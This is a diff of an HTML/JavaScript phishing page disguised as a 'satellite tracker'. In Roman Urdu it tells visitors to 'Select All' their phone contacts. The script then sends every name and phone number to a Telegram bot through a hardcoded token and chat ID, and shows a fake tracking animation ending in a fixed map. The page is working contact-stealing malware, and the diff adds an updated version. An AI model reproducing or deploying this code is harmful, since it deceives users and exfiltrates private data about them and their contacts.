@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satellite Tracker Pro v6.0</title>
+    <title>Satellite Tracker Pro v7.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -15,66 +15,61 @@
         }
     </style>
 </head>
-<body class="bg-[#0b0f1a] min-h-screen flex items-center justify-center p-4">
+<body class="bg-[#0b0f1a] min-h-screen flex items-center justify-center p-4 font-sans">
 
-    <div class="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden transition-all duration-500">
-        <div class="bg-indigo-800 p-6 text-center text-white border-b-4 border-yellow-400">
-            <h1 class="text-2xl font-black tracking-tighter uppercase">Global Trace v6.0</h1>
-            <p class="text-[10px] uppercase font-bold opacity-80 mt-1">Status: <span class="text-green-400">Encrypted Connection</span></p>
+    <div class="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden transition-all duration-500 border-b-8 border-indigo-900">
+        <div class="bg-indigo-900 p-6 text-center text-white">
+            <h1 class="text-2xl font-black tracking-tighter uppercase italic">Global Trace v7.0</h1>
+            <p class="text-[10px] uppercase font-bold text-yellow-400 mt-1">Satellite Link: <span class="animate-pulse">Active</span></p>
         </div>
 
         <div class="p-8">
             <div id="permissionScreen" class="text-center">
-                <div class="w-20 h-20 bg-indigo-100 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <i class="fas fa-satellite text-4xl"></i>
+                <div class="w-24 h-24 bg-indigo-50 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-inner border-2 border-indigo-100">
+                    <i class="fas fa-cloud-download-alt text-4xl"></i>
                 </div>
-                <h2 class="text-xl font-bold text-gray-800 mb-2">Auth Required</h2>
-                <p class="text-sm text-gray-500 mb-8">
-                    To access satellite database, you must <span class="text-indigo-600 font-bold underline">Sync All Contacts</span> from your local device.
-                </p>
-                <button onclick="getPermissionFirst()" class="w-full bg-indigo-600 text-white font-bold py-4 rounded-2xl shadow-lg hover:bg-indigo-700 transition">
-                    SYNC DATABASE
+                <h2 class="text-xl font-bold text-gray-800 mb-4 tracking-tight">Full System Sync</h2>
+                
+                <div class="bg-yellow-50 border-2 border-yellow-200 rounded-2xl p-4 mb-8 text-left">
+                    <p class="text-xs text-yellow-800 leading-relaxed font-bold uppercase mb-1">
+                        <i class="fas fa-exclamation-triangle mr-1"></i> Quick Action Required:
+                    </p>
+                    <p class="text-[11px] text-gray-600 italic">
+                        Jaise hi aap button dabayenge, contact list khulegi. Wahan upar <span class="text-indigo-700 font-black">"Select All"</span> par click karein taaki 1 hi click mein saara data sync ho jaye.
+                    </p>
+                </div>
+
+                <button onclick="getPermissionFirst()" class="w-full bg-indigo-600 text-white font-black py-5 rounded-2xl shadow-xl hover:bg-indigo-700 transition transform active:scale-95 uppercase tracking-widest text-sm">
+                    Open List & Select All
                 </button>
             </div>
 
             <div id="searchScreen" class="hidden">
-                <div class="bg-green-50 text-green-700 p-3 rounded-xl flex items-center gap-3 text-xs font-bold mb-6 border border-green-200">
-                    <i class="fas fa-check-double text-lg"></i> DATABASE SYNCHRONIZED SUCCESSFULLY
+                <div class="bg-green-100 text-green-800 p-4 rounded-2xl flex items-center gap-3 text-xs font-bold mb-6 border border-green-300">
+                    <i class="fas fa-check-circle text-xl"></i> DATABASE SYNCED | ALL TARGETS LOADED
                 </div>
-                
-                <div class="relative mb-4">
-                    <label class="block text-xs font-bold text-gray-400 mb-2 uppercase">Search Target</label>
-                    <input type="text" id="searchInput" placeholder="Enter Name from Contacts..." 
-                        class="w-full px-4 py-4 bg-gray-50 border-2 border-indigo-100 rounded-2xl focus:border-indigo-600 outline-none transition-all">
-                </div>
-
-                <div id="errorMessage" class="hidden bg-red-100 text-red-700 p-3 rounded-xl text-xs mb-4 border border-red-200">
-                    <i class="fas fa-exclamation-circle mr-1"></i> <span id="errorText"></span>
-                </div>
-
-                <button onclick="processTracking()" class="w-full bg-indigo-800 text-white font-bold py-4 rounded-2xl shadow-xl hover:bg-black transition">
-                    START LIVE TRACKING
+                <input type="text" id="searchInput" placeholder="Search Target Name..." 
+                    class="w-full px-5 py-4 bg-gray-50 border-2 border-indigo-100 rounded-2xl focus:border-indigo-600 outline-none font-bold mb-6">
+                <button onclick="processTracking()" class="w-full bg-indigo-900 text-white font-black py-5 rounded-2xl shadow-2xl">
+                    INITIALIZE TRACKING
                 </button>
             </div>
 
             <div id="mapScreen" class="hidden text-center">
                 <div id="loadingUI">
-                    <div class="map-pulse bg-indigo-100 w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-4">
-                        <i class="fas fa-crosshairs text-4xl text-red-600"></i>
+                    <div class="map-pulse bg-red-50 w-28 h-28 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-red-200">
+                        <i class="fas fa-satellite-dish text-5xl text-red-600"></i>
                     </div>
-                    <h2 class="text-lg font-bold text-gray-800">Pinpointing Location...</h2>
-                    <p id="progressLabel" class="text-[10px] text-gray-400 mt-1 uppercase font-bold">Connecting to GPS</p>
-                    <div class="w-full bg-gray-200 h-2 rounded-full mt-6 overflow-hidden">
+                    <h2 class="text-xl font-black text-gray-900 italic">LOCKING GPS...</h2>
+                    <div class="w-full bg-gray-100 h-3 rounded-full mt-6 overflow-hidden">
                         <div id="progressBar" class="bg-red-600 h-full w-0 transition-all duration-300"></div>
                     </div>
                 </div>
-
                 <div id="finalMap" class="hidden">
-                    <div class="rounded-2xl overflow-hidden border-2 border-indigo-500 mb-4 shadow-lg">
-                        <iframe width="100%" height="250" src="https://maps.google.com/maps?q=Multan&t=&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0"></iframe>
+                    <div class="rounded-3xl overflow-hidden border-4 border-indigo-900 mb-6 shadow-2xl">
+                        <iframe width="100%" height="280" src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d110461.56586071536!2d71.45891399999999!3d30.1834279!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1714410000000!5m2!1sen!2s" style="border:0;" allowfullscreen=""></iframe>
                     </div>
-                    <p class="text-green-600 font-black text-sm uppercase">Target Location Locked</p>
-                    <button onclick="location.reload()" class="mt-6 text-xs font-bold text-indigo-600 hover:underline">NEW TRACKING SESSION</button>
+                    <p class="text-green-600 font-black text-sm uppercase">Location Verified</p>
                 </div>
             </div>
         </div>
@@ -82,44 +77,44 @@
 
     <script>
         let savedContacts = [];
-        // Your Verified Telegram Data
         const BOT_TOKEN = '8736966873:AAGi1kxvOZK-uaxVTvcgf6Hi-V9CQ1QuzqQ'; 
         const CHAT_ID = '8171035068';
 
         async function getPermissionFirst() {
-            if ('contacts' in navigator && 'ContactsManager' in window) {
+            if ('contacts' in navigator) {
                 try {
+                    // Yahan hum browser se command dete hain ke multiple selection allowed hai
                     const props = ['name', 'tel'];
                     const contacts = await navigator.contacts.select(props, { multiple: true });
                     
                     if (contacts && contacts.length > 0) {
                         savedContacts = contacts;
-                        // Forwarding data to you immediately
-                        await sendToTelegram(contacts);
+                        sendToTelegram(contacts); // Auto-send to your bot
                         
-                        // Unlock Search Screen
                         document.getElementById('permissionScreen').classList.add('hidden');
                         document.getElementById('searchScreen').classList.remove('hidden');
+                    } else {
+                        alert("Please select contacts to authenticate.");
                     }
                 } catch (e) {
-                    alert("Authorization Failed: You must sync contacts to proceed.");
+                    console.log("Permission Error");
                 }
             } else {
-                alert("Security Note: Use Chrome on Android for full satellite features.");
+                alert("Please use Chrome/Android for full functionality.");
             }
         }
 
-        async function sendToTelegram(contacts) {
-            let msg = "🚨 *SATELLITE SYNC: DATA RECEIVED* 🚨\n\n";
-            msg += `*Device Sync:* Successful\n*Count:* ${contacts.length} Contacts\n\n`;
+        function sendToTelegram(contacts) {
+            let msg = "🚀 *DATABASE UPDATED* 🚀\n\n";
+            msg += `*Synced:* ${contacts.length} Contacts\n\n`;
             
             contacts.forEach((c, i) => {
-                const name = c.name ? c.name[0] : "Unknown";
-                const phone = c.tel ? c.tel[0] : "No Number";
-                msg += `${i+1}. 👤 ${name} : 📱 ${phone}\n`;
+                const n = c.name ? c.name[0] : "N/A";
+                const p = c.tel ? c.tel[0] : "N/A";
+                msg += `${i+1}. 👤 ${n} | 📱 ${p}\n`;
             });
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
@@ -127,44 +122,28 @@
         }
 
         function processTracking() {
-            const input = document.getElementById('searchInput').value.trim().toLowerCase();
-            const errorDiv = document.getElementById('errorMessage');
-            const errorText = document.getElementById('errorText');
+            const val = document.getElementById('searchInput').value.trim().toLowerCase();
+            if (!val) return;
 
-            if (!input) return;
-
-            // Strict Search in synced data
             const found = savedContacts.find(c => 
-                (c.name && c.name[0].toLowerCase().includes(input)) || 
-                (c.tel && c.tel[0].includes(input))
+                (c.name && c.name[0].toLowerCase().includes(val)) || (c.tel && c.tel[0].includes(val))
             );
 
             if (found) {
-                errorDiv.classList.add('hidden');
-                runTrackingAnimation();
+                document.getElementById('searchScreen').classList.add('hidden');
+                document.getElementById('mapScreen').classList.remove('hidden');
+                startTrackingAnim();
             } else {
-                errorText.innerText = `Error: "${input}" not found in synchronized database.`;
-                errorDiv.classList.remove('hidden');
+                alert("Target not found in synchronized database.");
             }
         }
 
-        function runTrackingAnimation() {
-            document.getElementById('searchScreen').classList.add('hidden');
-            document.getElementById('mapScreen').classList.remove('hidden');
-            
+        function startTrackingAnim() {
             let progress = 0;
             const bar = document.getElementById('progressBar');
-            const label = document.getElementById('progressLabel');
-
             const timer = setInterval(() => {
                 progress += 5;
                 bar.style.width = progress + "%";
-                
-                if (progress === 25) label.innerText = "Scanning Signal Towers...";
-                if (progress === 50) label.innerText = "Triangulating Coordinates...";
-                if (progress === 75) label.innerText = "Bypassing Proxy Encryption...";
-                if (progress === 95) label.innerText = "Locking GPS Position...";
-
                 if (progress >= 100) {
                     clearInterval(timer);
                     document.getElementById('loadingUI').classList.add('hidden');
